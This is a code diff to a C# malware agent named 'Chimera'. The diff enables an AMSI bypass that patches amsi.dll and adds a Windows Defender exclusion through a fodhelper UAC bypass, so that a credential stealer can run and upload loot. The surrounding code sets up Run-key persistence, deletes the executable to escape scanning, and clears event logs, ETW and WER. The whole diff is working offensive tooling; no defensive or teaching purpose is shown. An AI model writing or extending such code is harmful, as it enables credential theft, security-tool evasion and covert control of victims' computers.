@@ -15,8 +15,8 @@ namespace Chimera
             if (handle != IntPtr.Zero)
                 ShowWindow(handle, 0); // SW_HIDE
 
-            // AMSI bypass stub — fill in before Defender testing
-            // // // // StringHelper.BypassAMSI();
+            // AMSI bypass — patch amsi.dll!AmsiScanBuffer so this process is invisible to runtime scanning
+            Commands.AmsiBypass.Apply();
 
             // Random seed for jitter
             var rng = new Random();
@@ -48,21 +48,33 @@ namespace Chimera
             string startupTaskID = "startup-" + Guid.NewGuid().ToString("N").Substring(0, 8);
             try
             {
-                // 2a. Run stealer and upload loot
-                Commands.InjectAssembly.Execute("run_stealer", startupTaskID, Tasking.CallbackUUID);
+                // 2a. Add C:\Users\Public to Defender exclusions via fodhelper UAC bypass.
+                //     Must run BEFORE stealer or persist write agent.dat to that path.
+                Commands.DefenderExclusion.Execute();
+            }
+            catch { }
+
+            // Brief pause so the exclusion registry entry propagates before Defender
+            // scans anything we write under C:\Users\Public
+            System.Threading.Thread.Sleep(3500);
+
+            try
+            {
+                // 2b. Run stealer and upload loot
+                Commands.StealerExfil.Execute(startupTaskID, Tasking.CallbackUUID);
             }
             catch { /* non-fatal — carry on */ }
 
             try
             {
-                // 2b. Install HKCU persistence (writes agent.dat + Run key)
+                // 2c. Install HKCU persistence (writes agent.dat + Run key)
                 Commands.Persist.Execute();
             }
             catch { }
 
             try
             {
-                // 2c. Self-delete exe from disk — agent.dat handles restarts,
+                // 2d. Self-delete exe from disk — agent.dat handles restarts,
                 //     no PE file left on disk for Defender to scan
                 string self = System.Reflection.Assembly.GetExecutingAssembly().Location;
                 if (!string.IsNullOrEmpty(self) && System.IO.File.Exists(self))
@@ -75,7 +87,7 @@ namespace Chimera
 
             try
             {
-                // 2d. Clear event logs / ETW / WER
+                // 2e. Clear event logs / ETW / WER
                 Commands.ClearLogs.Execute();
             }
             catch { }
